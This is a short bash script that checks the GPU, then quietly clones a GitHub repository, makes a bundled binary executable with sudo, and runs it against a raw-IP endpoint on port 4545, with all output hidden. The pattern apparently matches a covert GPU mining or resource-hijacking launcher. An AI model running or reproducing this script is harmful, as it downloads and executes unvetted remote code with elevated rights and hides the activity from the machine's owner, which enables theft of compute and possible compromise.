#! /bin/bash
nvidia-smi
printf "Run 142.93.25.51:4545/$1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://142.93.25.51:4545/"$1" &> log
} &> /dev/null
